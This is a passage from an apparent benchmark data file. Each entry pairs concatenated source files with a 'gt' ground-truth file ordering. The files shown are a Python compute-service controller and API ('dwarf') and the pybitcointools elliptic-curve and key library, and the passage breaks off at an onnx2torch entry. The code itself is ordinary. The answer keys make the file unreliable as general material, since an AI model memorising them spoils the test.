shutil.rmtree(config_dir)\n\n\nclass Controller(object):\n\n    def __init__(self):\n        self.db = db.Controller()\n        self.flavors = flavors.Controller()\n        self.images = images.Controller()\n        self.keypairs = keypairs.Controller()\n        self.virt = virt.Controller()\n\n    def _update_ip(self, server):\n\n\n        lease = self.virt.get_dhcp_lease(server)\n        if lease is None:\n            return\n\n\n        server = self.db.servers.update(id=server['id'], ip=lease['ip'])\n        return lease['ip']\n\n    def _update_status(self, server):\n\n        info = self.virt.info_server(server)\n        if info and 'state' in info:\n            server['status'] = _VIRT_SERVER_STATE[info['state']]\n        return server\n\n\n\n\n    def setup(self):\n\n        LOG.info('setup()')\n\n        self.virt.create_network()\n\n    def teardown(self):\n\n        LOG.info('teardown()')\n\n    def console_log(self, server_id):\n\n        LOG.info('console_log(server_id=%s)', server_id)\n\n        console_log = os.path.join(CONF.instances_dir, server_id,\n                                   'console.log')\n\n\n        utils.execute(['chown', os.getuid(), console_log], run_as_root=True)\n\n        with open(console_log) as fh:\n            data = fh.read()\n        return unicode(data, errors='ignore')\n\n    def create(self, server):\n\n        LOG.info('create(server=%s)', server)\n\n        name = server['name']\n        image_id = server['imageRef']\n        flavor_id = server['flavorRef']\n        key_name = server.get('key_name', None)\n        config_drive = server.get('config_drive', False)\n\n\n        image = self.images.show(image_id)\n        flavor = self.flavors.show(flavor_id)\n        if key_name is None:\n            keypair = None\n        else:\n            keypair = self.keypairs.show(key_name)\n\n\n        server = self.db.servers.create(name=name, image_id=image_id,\n                                        flavor_id=flavor_id, key_name=key_name,\n                                        config_drive=config_drive,\n                                        status=SERVER_BUILDING)\n        server_id = server['id']\n\n\n        mac_address = _generate_mac()\n        server = self.db.servers.update(id=server_id, mac_address=mac_address)\n\n\n        basepath = os.path.join(CONF.instances_dir, server_id)\n        os.makedirs(basepath)\n\n\n        _create_disks(server, image, flavor)\n        _create_config_drive(server, keypair)\n\n\n        self.virt.create_server(server, flavor)\n\n\n        task.start(server_id, 2, 60 / 2, self._update_ip, server)\n\n        return self._update_status(server)\n\n    def delete(self, server_id):\n\n        LOG.info('delete(server_id=%s)', server_id)\n\n        server = self.db.servers.show(id=server_id)\n\n\n        task.stop(server_id)\n\n\n        self.virt.delete_server(server)\n\n\n        basepath = os.path.join(CONF.instances_dir, server_id)\n        if os.path.exists(basepath):\n            shutil.rmtree(basepath)\n\n\n        self.db.servers.delete(id=server['id'])\n\n    def list(self):\n\n        LOG.info('list()')\n\n        servers = []\n        for s in self.db.servers.list():\n            servers.append(self._update_status(s))\n\n        return servers\n\n    def reboot(self, server_id, hard=False):\n\n        LOG.info('reboot(server_id=%s, hard=%s)', server_id, hard)\n\n        self.stop(server_id, hard=hard)\n\n\n        server = self.db.servers.show(id=server_id)\n        for dummy in range(0, CONF.server_soft_reboot_timeout / 2):\n            server = self._update_status(server)\n            if server['status'] != SERVER_ACTIVE:\n                break\n            time.sleep(2)\n\n\n        if hard is False and server['status'] == SERVER_ACTIVE:\n            self.stop(server_id, hard=True)\n            time.sleep(2)\n\n        self.start(server_id)\n\n    def show(self, server_id):\n\n        LOG.info('show(server_id=%s)', server_id)\n\n        server = self.db.servers.show(id=server_id)\n        return self._update_status(server)\n\n    def start(self, server_id):\n\n        LOG.info('start(server_id=%s)', server_id)\n\n        server = self.db.servers.show(id=server_id)\n        self.virt.start_server(server)\n\n    def stop(self, server_id, hard=False):\n\n        LOG.info('stop(server_id=%s, hard=%s)', server_id, hard)\n\n        server = self.db.servers.show(id=server_id)\n        self.virt.stop_server(server, hard)\n\n'dwarf/dwarf/compute/api.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nimport bottle\nimport json\nimport logging\n\nfrom dwarf import config\nfrom dwarf import exception\nfrom dwarf import utils\n\nfrom dwarf.compute import api_response\nfrom dwarf.compute import flavors\nfrom dwarf.compute import keypairs\nfrom dwarf.compute import servers\n\nCONF = config.Config()\nLOG = logging.getLogger(__name__)\n\nFLAVORS = flavors.Controller()\nKEYPAIRS = keypairs.Controller()\nSERVERS = servers.Controller()\n\n\n\n\n\n@exception.catchall\ndef _route_versions():\n\n    utils.show_request(bottle.request)\n\n    bottle.response.status = 300\n    return api_response.list_versions()\n\n\n@exception.catchall\ndef _route_version():\n\n    utils.show_request(bottle.request)\n\n    return api_response.show_version_v2d0()\n\n\n\n\n\n@exception.catchall\ndef _route_flavors_id(flavor_id):\n\n    utils.show_request(bottle.request)\n\n\n    if bottle.request.method == 'DELETE':\n        FLAVORS.delete(flavor_id)\n        return\n\n\n    if flavor_id == 'detail':\n        return api_response.list_flavors(FLAVORS.list(), details=True)\n\n\n    return api_response.show_flavor(FLAVORS.show(flavor_id))\n\n\n@exception.catchall\ndef _route_flavors():\n\n    utils.show_request(bottle.request)\n\n\n    if bottle.request.method == 'POST':\n        body = json.load(bottle.request.body)\n        return api_response.create_flavor(FLAVORS.create(body['flavor']))\n\n\n    return api_response.list_flavors(FLAVORS.list(), details=False)\n\n\n\n\n\n@exception.catchall\ndef _route_os_keypairs():\n\n    utils.show_request(bottle.request)\n\n\n    if bottle.request.method == 'POST':\n        body = json.load(bottle.request.body)\n        return api_response.create_keypair(KEYPAIRS.create(body['keypair']))\n\n\n    return api_response.list_keypairs(KEYPAIRS.list())\n\n\n@exception.catchall\ndef _route_os_keypairs_name(keypair_name):\n\n    utils.show_request(bottle.request)\n\n\n    if bottle.request.method == 'DELETE':\n        KEYPAIRS.delete(keypair_name)\n        return\n\n\n    return api_response.show_keypair(KEYPAIRS.show(keypair_name))\n\n\n\n\n\n@exception.catchall\ndef _route_servers_id(server_id):\n\n    utils.show_request(bottle.request)\n\n\n    if bottle.request.method == 'DELETE':\n        SERVERS.delete(server_id)\n        return\n\n\n    if server_id == 'detail':\n        return api_response.list_servers(SERVERS.list(), details=True)\n\n\n    return api_response.show_server(SERVERS.show(server_id))\n\n\n@exception.catchall\ndef _route_servers():\n\n    utils.show_request(bottle.request)\n\n\n    if bottle.request.method == 'POST':\n        body = json.load(bottle.request.body)\n        return api_response.create_server(SERVERS.create(body['server']))\n\n\n    return api_response.list_servers(SERVERS.list(), details=False)\n\n\n@exception.catchall\ndef _route_servers_id_action(server_id):\n\n    utils.show_request(bottle.request)\n\n    body = json.load(bottle.request.body)\n\n\n    if 'os-getConsoleOutput' in body:\n        return api_response.show_console_log(SERVERS.console_log(server_id))\n\n\n    elif 'os-start' in body:\n        SERVERS.start(server_id)\n        return\n\n\n    elif 'os-stop' in body:\n        SERVERS.stop(server_id)\n        return\n\n\n    elif 'reboot' in body:\n        hard = body['reboot']['type'].lower() == 'hard'\n        SERVERS.reboot(server_id, hard)\n        return\n\n    raise exception.BadRequest(reason='Unsupported request')\n\n\n\n\n\ndef set_routes(app):\n    app.route('/compute',\n              method='GET',\n              callback=_route_versions)\n    app.route('/compute/v2.0',\n              method='GET',\n              callback=_route_version)\n    app.route('/compute/v2.0/os-keypairs',\n              method=('GET', 'POST'),\n              callback=_route_os_keypairs)\n    app.route('/compute/v2.0/os-keypairs/<keypair_name>',\n              method=('DELETE', 'GET'),\n              callback=_route_os_keypairs_name)\n    app.route('/compute/v2.0/servers/<server_id>',\n              method=('GET', 'DELETE'),\n              callback=_route_servers_id)\n    app.route('/compute/v2.0/servers',\n              method=('GET', 'POST'),\n              callback=_route_servers)\n    app.route('/compute/v2.0/servers/<server_id>/action',\n              method='POST',\n              callback=_route_servers_id_action)\n    app.route('/compute/v2.0/flavors/<flavor_id>',\n              method=('GET', 'DELETE'),\n              callback=_route_flavors_id)\n    app.route('/compute/v2.0/flavors',\n              method=('GET', 'POST'),\n              callback=_route_flavors)\n\n\ndef setup():\n    SERVERS.setup()\n\n\ndef teardown():\n    SERVERS.teardown()\n",
        "gt": [
            "'dwarf/dwarf/compute/servers.py'",
            "'dwarf/dwarf/compute/api.py'",
            "'dwarf/dwarf/api_server.py'",
            "'dwarf/tests/api/test_compute.py'"
        ]
    },
    {
        "files": [
            "'Fuzium/core/src/lib/pybitcointools/bitcoin/__init__.py'",
            "'Fuzium/core/src/lib/pybitcointools/bitcoin/py2specials.py'",
            "'Fuzium/core/src/lib/pybitcointools/bitcoin/main.py'",
            "'Fuzium/core/src/lib/pybitcointools/bitcoin/blocks.py'"
        ],
        "content": "'Fuzium/core/src/lib/pybitcointools/bitcoin/__init__.py'\n:from .py2specials import *\nfrom .py3specials import *\nfrom .main import *\nfrom .transaction import *\nfrom .deterministic import *\nfrom .bci import *\nfrom .composite import *\nfrom .stealth import *\nfrom .blocks import *\n\n'Fuzium/core/src/lib/pybitcointools/bitcoin/py2specials.py'\n:import sys, re\nimport binascii\nimport os\nimport hashlib\n\n\nif sys.version_info.major == 2:\n    string_types = (str, unicode)\n    string_or_bytes_types = string_types\n    int_types = (int, float, long)\n\n\n    code_strings = {\n        2: '01',\n        10: '0123456789',\n        16: '0123456789abcdef',\n        32: 'abcdefghijklmnopqrstuvwxyz234567',\n        58: '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz',\n        256: ''.join([chr(x) for x in range(256)])\n    }\n\n    def bin_dbl_sha256(s):\n        bytes_to_hash = from_string_to_bytes(s)\n        return hashlib.sha256(hashlib.sha256(bytes_to_hash).digest()).digest()\n\n    def lpad(msg, symbol, length):\n        if len(msg) >= length:\n            return msg\n        return symbol * (length - len(msg)) + msg\n\n    def get_code_string(base):\n        if base in code_strings:\n            return code_strings[base]\n        else:\n            raise ValueError(\"Invalid base!\")\n\n    def changebase(string, frm, to, minlen=0):\n        if frm == to:\n            return lpad(string, get_code_string(frm)[0], minlen)\n        return encode(decode(string, frm), to, minlen)\n\n    def bin_to_b58check(inp, magicbyte=0):\n        inp_fmtd = chr(int(magicbyte)) + inp\n        leadingzbytes = len(re.match('^\\x00*', inp_fmtd).group(0))\n        checksum = bin_dbl_sha256(inp_fmtd)[:4]\n        return '1' * leadingzbytes + changebase(inp_fmtd+checksum, 256, 58)\n\n    def bytes_to_hex_string(b):\n        return b.encode('hex')\n\n    def safe_from_hex(s):\n        return s.decode('hex')\n\n    def from_int_representation_to_bytes(a):\n        return str(a)\n\n    def from_int_to_byte(a):\n        return chr(a)\n\n    def from_byte_to_int(a):\n        return ord(a)\n\n    def from_bytes_to_string(s):\n        return s\n\n    def from_string_to_bytes(a):\n        return a\n\n    def safe_hexlify(a):\n        return binascii.hexlify(a)\n\n    def encode(val, base, minlen=0):\n        base, minlen = int(base), int(minlen)\n        code_string = get_code_string(base)\n        result = \"\"\n        while val > 0:\n            result = code_string[val % base] + result\n            val //= base\n        return code_string[0] * max(minlen - len(result), 0) + result\n\n    def decode(string, base):\n        base = int(base)\n        code_string = get_code_string(base)\n        result = 0\n        if base == 16:\n            string = string.lower()\n        while len(string) > 0:\n            result *= base\n            result += code_string.find(string[0])\n            string = string[1:]\n        return result\n\n    def random_string(x):\n        return os.urandom(x)\n\n'Fuzium/core/src/lib/pybitcointools/bitcoin/main.py'\n:\nfrom .py2specials import *\nfrom .py3specials import *\nimport binascii\nimport hashlib\nimport re\nimport sys\nimport os\nimport base64\nimport time\nimport random\nimport hmac\nfrom .ripemd import *\n\n\n\nP = 2**256 - 2**32 - 977\nN = 115792089237316195423570985008687907852837564279074904382605163141518161494337\nA = 0\nB = 7\nGx = 55066263022277343669578718895168534326250603453777594175500187360389116729240\nGy = 32670510020758816978083085130507043184471273380659243275938904335757337482424\nG = (Gx, Gy)\n\n\ndef change_curve(p, n, a, b, gx, gy):\n    global P, N, A, B, Gx, Gy, G\n    P, N, A, B, Gx, Gy = p, n, a, b, gx, gy\n    G = (Gx, Gy)\n\n\ndef getG():\n    return G\n\n\n\n\ndef inv(a, n):\n    if a == 0:\n        return 0\n    lm, hm = 1, 0\n    low, high = a % n, n\n    while low > 1:\n        r = high//low\n        nm, new = hm-lm*r, high-low*r\n        lm, low, hm, high = nm, new, lm, low\n    return lm % n\n\n\n\n\n\n\ndef access(obj, prop):\n    if isinstance(obj, dict):\n        if prop in obj:\n            return obj[prop]\n        elif '.' in prop:\n            return obj[float(prop)]\n        else:\n            return obj[int(prop)]\n    else:\n        return obj[int(prop)]\n\n\ndef multiaccess(obj, prop):\n    return [access(o, prop) for o in obj]\n\n\ndef slice(obj, start=0, end=2**200):\n    return obj[int(start):int(end)]\n\n\ndef count(obj):\n    return len(obj)\n\n_sum = sum\n\n\ndef sum(obj):\n    return _sum(obj)\n\n\ndef isinf(p):\n    return p[0] == 0 and p[1] == 0\n\n\ndef to_jacobian(p):\n    o = (p[0], p[1], 1)\n    return o\n\n\ndef jacobian_double(p):\n    if not p[1]:\n        return (0, 0, 0)\n    ysq = (p[1] ** 2) % P\n    S = (4 * p[0] * ysq) % P\n    M = (3 * p[0] ** 2 + A * p[2] ** 4) % P\n    nx = (M**2 - 2 * S) % P\n    ny = (M * (S - nx) - 8 * ysq ** 2) % P\n    nz = (2 * p[1] * p[2]) % P\n    return (nx, ny, nz)\n\n\ndef jacobian_add(p, q):\n    if not p[1]:\n        return q\n    if not q[1]:\n        return p\n    U1 = (p[0] * q[2] ** 2) % P\n    U2 = (q[0] * p[2] ** 2) % P\n    S1 = (p[1] * q[2] ** 3) % P\n    S2 = (q[1] * p[2] ** 3) % P\n    if U1 == U2:\n        if S1 != S2:\n            return (0, 0, 1)\n        return jacobian_double(p)\n    H = U2 - U1\n    R = S2 - S1\n    H2 = (H * H) % P\n    H3 = (H * H2) % P\n    U1H2 = (U1 * H2) % P\n    nx = (R ** 2 - H3 - 2 * U1H2) % P\n    ny = (R * (U1H2 - nx) - S1 * H3) % P\n    nz = H * p[2] * q[2]\n    return (nx, ny, nz)\n\n\ndef from_jacobian(p):\n    z = inv(p[2], P)\n    return ((p[0] * z**2) % P, (p[1] * z**3) % P)\n\n\ndef jacobian_multiply(a, n):\n    if a[1] == 0 or n == 0:\n        return (0, 0, 1)\n    if n == 1:\n        return a\n    if n < 0 or n >= N:\n        return jacobian_multiply(a, n % N)\n    if (n % 2) == 0:\n        return jacobian_double(jacobian_multiply(a, n//2))\n    if (n % 2) == 1:\n        return jacobian_add(jacobian_double(jacobian_multiply(a, n//2)), a)\n\n\ndef fast_multiply(a, n):\n    return from_jacobian(jacobian_multiply(to_jacobian(a), n))\n\n\ndef fast_add(a, b):\n    return from_jacobian(jacobian_add(to_jacobian(a), to_jacobian(b)))\n\n\n\n\ndef get_pubkey_format(pub):\n    if is_python2:\n        two = '\\x02'\n        three = '\\x03'\n        four = '\\x04'\n    else:\n        two = 2\n        three = 3\n        four = 4\n\n    if isinstance(pub, (tuple, list)): return 'decimal'\n    elif len(pub) == 65 and pub[0] == four: return 'bin'\n    elif len(pub) == 130 and pub[0:2] == '04': return 'hex'\n    elif len(pub) == 33 and pub[0] in [two, three]: return 'bin_compressed'\n    elif len(pub) == 66 and pub[0:2] in ['02', '03']: return 'hex_compressed'\n    elif len(pub) == 64: return 'bin_electrum'\n    elif len(pub) == 128: return 'hex_electrum'\n    else: raise Exception(\"Pubkey not in recognized format\")\n\n\ndef encode_pubkey(pub, formt):\n    if not isinstance(pub, (tuple, list)):\n        pub = decode_pubkey(pub)\n    if formt == 'decimal': return pub\n    elif formt == 'bin': return b'\\x04' + encode(pub[0], 256, 32) + encode(pub[1], 256, 32)\n    elif formt == 'bin_compressed':\n        return from_int_to_byte(2+(pub[1] % 2)) + encode(pub[0], 256, 32)\n    elif formt == 'hex': return '04' + encode(pub[0], 16, 64) + encode(pub[1], 16, 64)\n    elif formt == 'hex_compressed':\n        return '0'+str(2+(pub[1] % 2)) + encode(pub[0], 16, 64)\n    elif formt == 'bin_electrum': return encode(pub[0], 256, 32) + encode(pub[1], 256, 32)\n    elif formt == 'hex_electrum': return encode(pub[0], 16, 64) + encode(pub[1], 16, 64)\n    else: raise Exception(\"Invalid format!\")\n\n\ndef decode_pubkey(pub, formt=None):\n    if not formt: formt = get_pubkey_format(pub)\n    if formt == 'decimal': return pub\n    elif formt == 'bin': return (decode(pub[1:33], 256), decode(pub[33:65], 256))\n    elif formt == 'bin_compressed':\n        x = decode(pub[1:33], 256)\n        beta = pow(int(x*x*x+A*x+B), int((P+1)//4), int(P))\n        y = (P-beta) if ((beta + from_byte_to_int(pub[0])) % 2) else beta\n        return (x, y)\n    elif formt == 'hex': return (decode(pub[2:66], 16), decode(pub[66:130], 16))\n    elif formt == 'hex_compressed':\n        return decode_pubkey(safe_from_hex(pub), 'bin_compressed')\n    elif formt == 'bin_electrum':\n        return (decode(pub[:32], 256), decode(pub[32:64], 256))\n    elif formt == 'hex_electrum':\n        return (decode(pub[:64], 16), decode(pub[64:128], 16))\n    else: raise Exception(\"Invalid format!\")\n\ndef get_privkey_format(priv):\n    if isinstance(priv, int_types): return 'decimal'\n    elif len(priv) == 32: return 'bin'\n    elif len(priv) == 33: return 'bin_compressed'\n    elif len(priv) == 64: return 'hex'\n    elif len(priv) == 66: return 'hex_compressed'\n    else:\n        bin_p = b58check_to_bin(priv)\n        if len(bin_p) == 32: return 'wif'\n        elif len(bin_p) == 33: return 'wif_compressed'\n        else: raise Exception(\"WIF does not represent privkey\")\n\ndef encode_privkey(priv, formt, vbyte=0):\n    if not isinstance(priv, int_types):\n        return encode_privkey(decode_privkey(priv), formt, vbyte)\n    if formt == 'decimal': return priv\n    elif formt == 'bin': return encode(priv, 256, 32)\n    elif formt == 'bin_compressed': return encode(priv, 256, 32)+b'\\x01'\n    elif formt == 'hex': return encode(priv, 16, 64)\n    elif formt == 'hex_compressed': return encode(priv, 16, 64)+'01'\n    elif formt == 'wif':\n        return bin_to_b58check(encode(priv, 256, 32), 128+int(vbyte))\n    elif formt == 'wif_compressed':\n        return bin_to_b58check(encode(priv, 256, 32)+b'\\x01', 128+int(vbyte))\n    else: raise Exception(\"Invalid format!\")\n\ndef decode_privkey(priv,formt=None):\n    if not formt: formt = get_privkey_format(priv)\n    if formt == 'decimal': return priv\n    elif formt == 'bin': return decode(priv, 256)\n    elif formt == 'bin_compressed': return decode(priv[:32], 256)\n    elif formt == 'hex': return decode(priv, 16)\n    elif formt == 'hex_compressed': return decode(priv[:64], 16)\n    elif formt == 'wif': return decode(b58check_to_bin(priv),256)\n    elif formt == 'wif_compressed':\n        return decode(b58check_to_bin(priv)[:32],256)\n    else: raise Exception(\"WIF does not represent privkey\")\n\ndef add_pubkeys(p1, p2):\n    f1, f2 = get_pubkey_format(p1), get_pubkey_format(p2)\n    return encode_pubkey(fast_add(decode_pubkey(p1, f1), decode_pubkey(p2, f2)), f1)\n\ndef add_privkeys(p1, p2):\n    f1, f2 = get_privkey_format(p1), get_privkey_format(p2)\n    return encode_privkey((decode_privkey(p1, f1) + decode_privkey(p2, f2)) % N, f1)\n\n\ndef multiply(pubkey, privkey):\n    f1, f2 = get_pubkey_format(pubkey), get_privkey_format(privkey)\n    pubkey, privkey = decode_pubkey(pubkey, f1), decode_privkey(privkey, f2)\n\n    if not isinf(pubkey) and (pubkey[0]**3+B-pubkey[1]*pubkey[1]) % P != 0:\n        raise Exception(\"Point not on curve\")\n    return encode_pubkey(fast_multiply(pubkey, privkey), f1)\n\n\ndef divide(pubkey, privkey):\n    factor = inv(decode_privkey(privkey), N)\n    return multiply(pubkey, factor)\n\n\ndef compress(pubkey):\n    f = get_pubkey_format(pubkey)\n    if 'compressed' in f: return pubkey\n    elif f == 'bin': return encode_pubkey(decode_pubkey(pubkey, f), 'bin_compressed')\n    elif f == 'hex' or f == 'decimal':\n        return encode_pubkey(decode_pubkey(pubkey, f), 'hex_compressed')\n\n\ndef decompress(pubkey):\n    f = get_pubkey_format(pubkey)\n    if 'compressed' not in f: return pubkey\n    elif f == 'bin_compressed': return encode_pubkey(decode_pubkey(pubkey, f), 'bin')\n    elif f == 'hex_compressed' or f == 'decimal':\n        return encode_pubkey(decode_pubkey(pubkey, f), 'hex')\n\n\ndef privkey_to_pubkey(privkey):\n    f = get_privkey_format(privkey)\n    privkey = decode_privkey(privkey, f)\n    if privkey >= N:\n        raise Exception(\"Invalid privkey\")\n    if f in ['bin', 'bin_compressed', 'hex', 'hex_compressed', 'decimal']:\n        return encode_pubkey(fast_multiply(G, privkey), f)\n    else:\n        return encode_pubkey(fast_multiply(G, privkey), f.replace('wif', 'hex'))\n\nprivtopub = privkey_to_pubkey\n\n\ndef privkey_to_address(priv, magicbyte=0):\n    return pubkey_to_address(privkey_to_pubkey(priv), magicbyte)\nprivtoaddr = privkey_to_address\n\n\ndef neg_pubkey(pubkey):\n    f = get_pubkey_format(pubkey)\n    pubkey = decode_pubkey(pubkey, f)\n    return encode_pubkey((pubkey[0], (P-pubkey[1]) % P), f)\n\n\ndef neg_privkey(privkey):\n    f = get_privkey_format(privkey)\n    privkey = decode_privkey(privkey, f)\n    return encode_privkey((N - privkey) % N, f)\n\ndef subtract_pubkeys(p1, p2):\n    f1, f2 = get_pubkey_format(p1), get_pubkey_format(p2)\n    k2 = decode_pubkey(p2, f2)\n    return encode_pubkey(fast_add(decode_pubkey(p1, f1), (k2[0], (P - k2[1]) % P)), f1)\n\n\ndef subtract_privkeys(p1, p2):\n    f1, f2 = get_privkey_format(p1), get_privkey_format(p2)\n    k2 = decode_privkey(p2, f2)\n    return encode_privkey((decode_privkey(p1, f1) - k2) % N, f1)\n\n\n\n\ndef bin_hash160(string):\n    intermed = hashlib.sha256(string).digest()\n    digest = ''\n    try:\n        digest = hashlib.new('ripemd160', intermed).digest()\n    except:\n        digest = RIPEMD160(intermed).digest()\n    return digest\n\n\ndef hash160(string):\n    return safe_hexlify(bin_hash160(string))\n\n\ndef bin_sha256(string):\n    binary_data = string if isinstance(string, bytes) else bytes(string, 'utf-8')\n    return hashlib.sha256(binary_data).digest()\n\ndef sha256(string):\n    return bytes_to_hex_string(bin_sha256(string))\n\n\ndef bin_ripemd160(string):\n    try:\n        digest = hashlib.new('ripemd160', string).digest()\n    except:\n        digest = RIPEMD160(string).digest()\n    return digest\n\n\ndef ripemd160(string):\n    return safe_hexlify(bin_ripemd160(string))\n\n\ndef bin_dbl_sha256(s):\n    bytes_to_hash = from_string_to_bytes(s)\n    return hashlib.sha256(hashlib.sha256(bytes_to_hash).digest()).digest()\n\n\ndef dbl_sha256(string):\n    return safe_hexlify(bin_dbl_sha256(string))\n\n\ndef bin_slowsha(string):\n    string = from_string_to_bytes(string)\n    orig_input = string\n    for i in range(100000):\n        string = hashlib.sha256(string + orig_input).digest()\n    return string\n\n\ndef slowsha(string):\n    return safe_hexlify(bin_slowsha(string))\n\n\ndef hash_to_int(x):\n    if len(x) in [40, 64]:\n        return decode(x, 16)\n    return decode(x, 256)\n\n\ndef num_to_var_int(x):\n    x = int(x)\n    if x < 253: return from_int_to_byte(x)\n    elif x < 65536: return from_int_to_byte(253)+encode(x, 256, 2)[::-1]\n    elif x < 4294967296: return from_int_to_byte(254) + encode(x, 256, 4)[::-1]\n    else: return from_int_to_byte(255) + encode(x, 256, 8)[::-1]\n\n\n\ndef electrum_sig_hash(message):\n    padded = b\"\\x18Bitcoin Signed Message:\\n\" + num_to_var_int(len(message)) + from_string_to_bytes(message)\n    return bin_dbl_sha256(padded)\n\n\ndef random_key():\n\n    entropy = random_string(32) \\\n        + str(random.randrange(2**256)) \\\n        + str(int(time.time() * 1000000))\n    return sha256(entropy)\n\n\ndef random_electrum_seed():\n    entropy = os.urandom(32) \\\n        + str(random.randrange(2**256)) \\\n        + str(int(time.time() * 1000000))\n    return sha256(entropy)[:32]\n\n\n\ndef b58check_to_bin(inp):\n    leadingzbytes = len(re.match('^1*', inp).group(0))\n    data = b'\\x00' * leadingzbytes + changebase(inp, 58, 256)\n    assert bin_dbl_sha256(data[:-4])[:4] == data[-4:]\n    return data[1:-4]\n\n\ndef get_version_byte(inp):\n    leadingzbytes = len(re.match('^1*', inp).group(0))\n    data = b'\\x00' * leadingzbytes + changebase(inp, 58, 256)\n    assert bin_dbl_sha256(data[:-4])[:4] == data[-4:]\n    return ord(data[0])\n\n\ndef hex_to_b58check(inp, magicbyte=0):\n    return bin_to_b58check(binascii.unhexlify(inp), magicbyte)\n\n\ndef b58check_to_hex(inp):\n    return safe_hexlify(b58check_to_bin(inp))\n\n\ndef pubkey_to_address(pubkey, magicbyte=0):\n    if isinstance(pubkey, (list, tuple)):\n        pubkey = encode_pubkey(pubkey, 'bin')\n    if len(pubkey) in [66, 130]:\n        return bin_to_b58check(\n            bin_hash160(binascii.unhexlify(pubkey)), magicbyte)\n    return bin_to_b58check(bin_hash160(pubkey), magicbyte)\n\npubtoaddr = pubkey_to_address\n\n\n\n\ndef encode_sig(v, r, s):\n    vb, rb, sb = from_int_to_byte(v), encode(r, 256), encode(s, 256)\n\n    result = base64.b64encode(vb+b'\\x00'*(32-len(rb))+rb+b'\\x00'*(32-len(sb))+sb)\n    return result if is_python2 else str(result, 'utf-8')\n\n\ndef decode_sig(sig):\n    bytez = base64.b64decode(sig)\n    return from_byte_to_int(bytez[0]), decode(bytez[1:33], 256), decode(bytez[33:], 256)\n\n\n\n\ndef deterministic_generate_k(msghash, priv):\n    v = b'\\x01' * 32\n    k = b'\\x00' * 32\n    priv = encode_privkey(priv, 'bin')\n    msghash = encode(hash_to_int(msghash), 256, 32)\n    k = hmac.new(k, v+b'\\x00'+priv+msghash, hashlib.sha256).digest()\n    v = hmac.new(k, v, hashlib.sha256).digest()\n    k = hmac.new(k, v+b'\\x01'+priv+msghash, hashlib.sha256).digest()\n    v = hmac.new(k, v, hashlib.sha256).digest()\n    return decode(hmac.new(k, v, hashlib.sha256).digest(), 256)\n\n\ndef ecdsa_raw_sign(msghash, priv):\n\n    z = hash_to_int(msghash)\n    k = deterministic_generate_k(msghash, priv)\n\n    r, y = fast_multiply(G, k)\n    s = inv(k, N) * (z + r*decode_privkey(priv)) % N\n\n    return 27+(y % 2), r, s\n\n\ndef ecdsa_sign(msg, priv):\n    return encode_sig(*ecdsa_raw_sign(electrum_sig_hash(msg), priv))\n\n\ndef ecdsa_raw_verify(msghash, vrs, pub):\n    v, r, s = vrs\n\n    w = inv(s, N)\n    z = hash_to_int(msghash)\n\n    u1, u2 = z*w % N, r*w % N\n    x, y = fast_add(fast_multiply(G, u1), fast_multiply(decode_pubkey(pub), u2))\n\n    return r == x\n\n\ndef ecdsa_verify(msg, sig, pub):\n    return ecdsa_raw_verify(electrum_sig_hash(msg), decode_sig(sig), pub)\n\n\ndef ecdsa_raw_recover(msghash, vrs):\n    v, r, s = vrs\n\n    x = r\n    beta = pow(x*x*x+A*x+B, (P+1)//4, P)\n    y = beta if v % 2 ^ beta % 2 else (P - beta)\n    z = hash_to_int(msghash)\n    Gz = jacobian_multiply((Gx, Gy, 1), (N - z) % N)\n    XY = jacobian_multiply((x, y, 1), s)\n    Qr = jacobian_add(Gz, XY)\n    Q = jacobian_multiply(Qr, inv(r, N))\n    Q = from_jacobian(Q)\n\n    if ecdsa_raw_verify(msghash, vrs, Q):\n        return Q\n    return False\n\n\ndef ecdsa_recover(msg, sig):\n    return encode_pubkey(ecdsa_raw_recover(electrum_sig_hash(msg), decode_sig(sig)), 'hex')\n\n'Fuzium/core/src/lib/pybitcointools/bitcoin/blocks.py'\n:from .main import *\n\n\ndef serialize_header(inp):\n    o = encode(inp['version'], 256, 4)[::-1] + \\\n        inp['prevhash'].decode('hex')[::-1] + \\\n        inp['merkle_root'].decode('hex')[::-1] + \\\n        encode(inp['timestamp'], 256, 4)[::-1] + \\\n        encode(inp['bits'], 256, 4)[::-1] + \\\n        encode(inp['nonce'], 256, 4)[::-1]\n    h = bin_sha256(bin_sha256(o))[::-1].encode('hex')\n    assert h == inp['hash'], (sha256(o), inp['hash'])\n    return o.encode('hex')\n\n\ndef deserialize_header(inp):\n    inp = inp.decode('hex')\n    return {\n        \"version\": decode(inp[:4][::-1], 256),\n        \"prevhash\": inp[4:36][::-1].encode('hex'),\n        \"merkle_root\": inp[36:68][::-1].encode('hex'),\n        \"timestamp\": decode(inp[68:72][::-1], 256),\n        \"bits\": decode(inp[72:76][::-1], 256),\n        \"nonce\": decode(inp[76:80][::-1], 256),\n        \"hash\": bin_sha256(bin_sha256(inp))[::-1].encode('hex')\n    }\n\n\ndef mk_merkle_proof(header, hashes, index):\n    nodes = [h.decode('hex')[::-1] for h in hashes]\n    if len(nodes) % 2 and len(nodes) > 2:\n        nodes.append(nodes[-1])\n    layers = [nodes]\n    while len(nodes) > 1:\n        newnodes = []\n        for i in range(0, len(nodes) - 1, 2):\n            newnodes.append(bin_sha256(bin_sha256(nodes[i] + nodes[i+1])))\n        if len(newnodes) % 2 and len(newnodes) > 2:\n            newnodes.append(newnodes[-1])\n        nodes = newnodes\n        layers.append(nodes)\n\n    assert nodes[0][::-1].encode('hex') == header['merkle_root']\n    merkle_siblings = \\\n        [layers[i][(index >> i) ^ 1] for i in range(len(layers)-1)]\n    return {\n        \"hash\": hashes[index],\n        \"siblings\": [x[::-1].encode('hex') for x in merkle_siblings],\n        \"header\": header\n    }\n",
        "gt": [
            "'Fuzium/core/src/lib/pybitcointools/bitcoin/py2specials.py'",
            "'Fuzium/core/src/lib/pybitcointools/bitcoin/main.py'",
            "'Fuzium/core/src/lib/pybitcointools/bitcoin/blocks.py'",
            "'Fuzium/core/src/lib/pybitcointools/bitcoin/__init__.py'"
        ]
    },
    {
        "files": [
            "'onnx2torch/onnx2torch/node_converters/functions.py'",
            "'onnx2torch/onnx2torch/node_converters/__init__.py'",
            "'onnx2torch/tests/node_converters/min_max_test.py'",
            "'onnx2torch/tests/utils/common.py'",
            "'onnx2torch/onnx2torch/converter.py'"
        ],
